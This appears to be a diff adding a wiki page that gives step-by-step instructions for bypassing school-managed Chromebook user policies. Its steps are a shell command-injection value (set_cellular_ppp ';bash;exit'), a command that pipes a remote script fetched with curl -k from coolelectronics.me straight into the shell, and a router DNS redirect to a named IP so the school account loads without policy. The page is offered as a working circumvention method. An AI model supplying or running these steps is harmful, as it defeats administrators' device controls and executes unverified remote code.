@@ -1,0 +1,34 @@
+---
+title: "UserPolicy Bypass:"
+slug: "UserPolicy_Bypass_"
+description: "Enables ARC to unblock all chrome://policy URLs"
+---
+
+# UserPolicy Bypass:
+
+This should enable ARC (Play Store) and unblock all **policy** blocked URLs.
+
+When you connect to a wifi without the custom DNS the policy will reload to normal but some changes will persist, more testing is needed. This is useful because most root exploits require ARC in some form.
+
+## You need:
+
+- The ability to downgrade to a version below 102
+- A way to access crosh. If it's blocked via extension, use LTBEEF. If it's blocked by user policy, you must use a combination of Incognito Exploit (v81) and Crosh Bypass (Daybreak)
+- A router or hotspot capable of either blocking websites via parental control or setting a custom DNS (129.213.58.41)
+
+## Steps:
+
+- Downgrade to a version
+- Open crosh (ctrl+alt+t)
+- Elevate to a chronos shell by typing in set_cellular_ppp \';bash;exit\'
+- Run the command `sh <(curl -k https://coolelectronics.me/bypass.sh) & disown`
+- Remove your school account, log out or just clear it in any way you can. The method varies depending on how device policy is set up.
+- In your router settings, set the DNS to `129.213.58.41` or `block m.google.com`. (NOT THE NETWORK DNS ON THE CHROMEBOOK, IT WONT WORK; ROUTER!)
+
+**[EXTRAS]:** personalDNSfilter and hotspot or DNS Sinkhole + Hotspot on iOS can be used; NextDNS
+
+- Log into your school account
+
+Results should prompt you about a PIN and Google Play then drop you into an account where everything works as normal but no user policies are set. If you get a "sign in required" error, try steps again.
+
+https://discord.com/channels/419123358698045453/1040639727595950180
